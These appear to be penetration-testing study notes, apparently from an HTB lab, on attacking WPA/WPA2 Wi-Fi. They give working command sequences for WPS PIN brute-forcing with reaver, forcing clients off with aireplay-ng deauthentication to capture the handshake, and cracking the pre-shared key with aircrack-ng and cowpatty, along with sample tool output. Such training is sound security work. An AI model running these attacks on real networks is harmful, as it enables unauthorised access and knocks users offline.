
## WPA/WPA2
___
**Main attack methods:**

1. Check if WPS is enabled and brute-force the PIN.
2. Capture the 4-way handshake and perform a dictionary attack to recover the PSK.
3. Execute a PMKID attack on vulnerable access points.


### WPS Brute force
___
**Check if wps is enabled**:

with airodump:
```bash
airodump-ng wlan0mon -c 1 --wps
```

with wash:
```bash
wash -i wlan0mon
```
if Lck = No, WPS is enabled.

Also, determine the vendor with the first three sets from the MAC
```bash
grep -i "28-B2-BD" /var/lib/ieee-data/oui.txt
```

**Bruteforce WPS key with reaver**

turn off monitor mode from airmon to ensure Reaver works.
```bash
airmon-ng stop wlan0mon
```

use the iw command to add a new interface named mon0 and set its type to monitor mode.

```bash
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up
```

**Launch Reaver**
specifying the BSSID of our target, the appropriate channel, and our interface in monitor mode (mon0)

```bash
reaver -i mon0 -c 1 -b 28:B2:BD:F4:FF:F1
```


## Cracking MIC (4-Way Handshake)
---
Capture the MIC

```bash
sudo airmon-ng start wlan0
```

Identify networks (save to file WPA)

```bash
airodump-ng wlan0mon -c 1 -w WPA
```

Deauth clients and capture handshake on reconnect

```bash
aireplay-ng -0 5 -a <AP BSSID> -c <STATION> wlan0mon
```

After a few seconds a WPA handshake should be captured in the airodump output.
```plaintext
 CH  1 ][ Elapsed: 48 s ][ 2024-08-29 21:58 ][ WPA handshake: 80:2D:BF:FE:13:83 
```

We need to ensure we've captured the complete handshake before attempting to crack

With cowpatty:
`-c` = check mode
```
cowpatty -c -r WPA-01.cap
```

or with wireshark:

check the following:

- All four EAPOL messages exist per each handshake in sequential order
- Key nonce values are the same in message 1 and 3
- For message four, we should see no key nonce value and only a MIC value.

**Crack the handshake**

with cowpatty:
```bash
cowpatty -r WPA-01.cap -f /opt/wordlist.txt -s <SSID>
```

or with aircrack

```bash
aircrack-ng -w /opt/wordlist.txt -0 WPA-01.cap 
```




### Deauth attacks

**List attack modes**

```bash
aireplay-ng

 Attack modes (numbers can still be used):
      --deauth      count : deauthenticate 1 or all stations (-0)
      --fakeauth    delay : fake authentication with AP (-1)
      --interactive       : interactive frame selection (-2)
      --arpreplay         : standard ARP-request replay (-3)
      --chopchop          : decrypt/chopchop WEP packet (-4)
      --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)

      --help              : Displays this usage screen
```

| **Attack** | **Attack Name**                      |
| ---------- | ------------------------------------ |
| `Attack 0` | Deauthentication                     |
| `Attack 1` | Fake authentication                  |
| `Attack 2` | Interactive packet replay            |
| `Attack 3` | ARP request replay attack            |
| `Attack 4` | KoreK chopchop attack                |
| `Attack 5` | Fragmentation attack                 |
| `Attack 6` | Cafe-latte attack                    |
| `Attack 7` | Client-oriented fragmentation attack |
| `Attack 8` | WPA Migration Mode                   |
| `Attack 9` | Injection test                       |

Before sending deauthentication frames, it's important to verify if our wireless card can successfully inject frames into the target access point (AP).

1. Enable monitor mode on channel

```bash
airmon-ng start wlan0 1
```

2. test for packet injection

```bash
sudo aireplay-ng --test wlan0mon
```
(we should see `Injection is working!`)


**Now we know we can inject packets with our interface, lets perform the deauth**

Identify the AP
```bash
sudo airodump-ng wlan0mon

CH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][
                                                                                                            
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                            
 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              TOMMY                         
 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  HTB 
 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  jhony                             

 BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes

 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14           HTB 
 (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4            
 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5           HTB 
 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           jhony
```

From the above output, we can see that there are three available WiFi networks, and `two clients` are connected to the network named `HTB`. Let's send a deauthentication request to one of the clients with the station ID `00:0F:B5:32:31:31`.

```bash
sudo aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon
```
- `-0` means deauthentication
- `5` is the number of deauths to send (you can send multiple if you wish); `0` means send them continuously
- `-a 00:14:6C:7A:41:81` is the MAC address of the access point
- `-c 00:0F:B5:32:31:31` is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated
- `wlan0mon` is the interface name

Once the clients are deauthenticated from the AP, we can continue observing `airodump-ng` to see when they reconnect.

```bash
sudo airodump-ng wlan0mon

CH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7A:41:81
                                                                                                            
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                            
 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              TOMMY                         
 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  HTB 
 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  jhony                             

 BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes

 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24   212     145   EAPOL  HTB 
 (not associated)   00:14:A4:3F:8D:13   19    0-0      0       4            
 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36     0       5          HTB 
 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54     0       9          jhony

```


In the output above, we can see that after sending the deauthentication packet, the client disconnects and then reconnects. This is evidenced by the increase in `Lost` packets and `Frames` count.

Additionally, a `four-way handshake` would be captured by `airodump-ng`, as shown in the output. By using the `-w` option in airodump-ng, we can save the captured WPA handshake into a `.pcap` file. This file can then be used with tools like `aircrack-ng` to crack the pre-shared key (PSK)


